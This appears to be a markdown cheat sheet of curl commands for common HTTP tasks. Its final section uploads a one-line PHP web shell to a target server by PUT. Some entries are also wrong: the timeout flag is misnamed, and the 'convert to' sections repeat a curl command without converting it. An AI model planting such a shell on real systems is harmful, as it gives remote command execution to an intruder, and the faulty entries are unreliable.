---
title: Curl Basics
date: {{ date }}
icon: icon-curl
background: bg-blue-400
tags:
- curl
categories:
- Linux Command
intro: A quick cheat sheet for curl
plugins:
- copyCode
---

Curl Basics
---------------

### Get header
```shell script {.wrap}
curl -i INSERTIPADDRESS
```
### Curl follow redirects
```shell script {.wrap}
curl -i -L INSERTIPADDRESS
```

### Ignore ssl error
```shell script {.wrap}
curl -k https://expired.badssl.com
```

### Curl with cookies
```shell script {.wrap}
curl --cookie "Name=Value" https://sample-site.com
curl -b "name1=value1; name2=value2" https://reqbin.com
```

### Curl set USER-AGENT
```shell script {.wrap}
curl https://sample-site.com -A "ReqBin Curl Client/1.0"
```

### Set timeout curl
```shell script {.wrap}
curl --connection-timeout 5 https://sample-site.com
```

### Post Json Curl
```shell script {.wrap}
curl -X POST https://sample-site.com/post/json -H 'Content-Type: application/json' -d '{"login":"my_login","password":"my_password"}'
```

### Post with body curl
```shell script {.wrap}
curl -X POST https://sample-site.com/post/json -H "Content-Type: application/json" -d '{"productId": 123456, "quantity": 100}'
```

### Send HTTP Header curl
```shell script {.wrap}
curl https://sample-site.com/get/json -H "X-Custom-Header: value" -H "Content-Type: application/json"
```

### Basic auth curl
```shell script {.wrap}
curl https://sample-site.com -u "login:password"
```

### Post file using curl
```shell script {.wrap}
curl -d @data.json https://sample-site.com/post/json
```

### Curl through proxy
```shell script {.wrap}
curl https://sample-site.com -x myproxy.com:8080 -U login:password
```

### Curl Follow redirects
```shell script {.wrap}
curl https://www.reqbin.com/echo -L
```

### Curl with bearer token authrizaion header
```shell script {.wrap}
curl https://sample-site.com/get/json -H "Accept: application/json" -H "Authorization: Bearer {token}"
```

### Curl fetching json
```shell script {.wrap}
curl https://sample-site.com/get/json -H "Accept: application/json"
```

### Post form data with curl
```shell script {.wrap}
curl -X POST https://sample-site.com/post/form -H "Content-Type: application/x-www-form-urlencoded" -d "param1=value1&param2=value2"
```

### Set Content type curl
```shell script {.wrap}
curl -X POST https://sample-site.com/post/json -H 'Content-Type: application/json' -H 'Accept: application/json' -d '{"Id": 78912, "Quantity": 1, "Price": 19.00}'
```

### Post XML with curl
```shell script {.wrap}
curl -X POST https://sample-site.com/post/xml -H "Content-Type: application/xml" -H "Accept: application/xml" -d "<Request><Login>my_login</Login><Password>my_password</Password></Request>"
```

### Curl fetch XML
```shell script {.wrap}
curl https://sample-site.com/get/xml -H "Accept: application/xml"
```

### Curl send PUT request
```shell script {.wrap}
curl -X PUT https://sample-site.com/put/json -d "PUT request data"
```

### Curl send DELETE request
```shell script {.wrap}
curl -X DELETE //reqbin.com/sample/delete/json?id=1 -H "Accept: application/json"
```

### Curl send OPTIONS request
```shell script {.wrap}
curl https://api.reqbin.com/api/v1/requests -X OPTIONS -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" -H "Origin: https://reqbin.com"
```

### Curl send CORS request
```shell script {.wrap}
curl -H "Origin: https://example.reqbin.com" https://sample-site.com
```

### Curl convert to PYTHON
```shell script {.wrap}
curl -X POST https://sample-site.com/post/json -H "Content-Type: application/json" -d "{\"login\":\"my_login\",\"password\":\"my_password\"}"
```

### Curl convert to Javascript / AJAX Calls
```shell script {.wrap}
curl -X POST https://sample-site.com/post/json -H "Content-Type: application/json" -d "{\"login\":\"my_login\",\"password\":\"my_password\"}"
```

### Curl convert to PHP
```shell script {.wrap}
curl -X POST https://sample-site.com/post/json -H "Content-Type: application/json" -d "{\"login\":\"my_login\",\"password\":\"my_password\"}"
```

### Curl convert to HTTP request
```shell script {.wrap}
curl https://sample-site.com/get/json -H "Content-Type: application/json" -H "Accept: application/json"
```

### Check if it is possible to upload using put
```shell script {.wrap}
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
```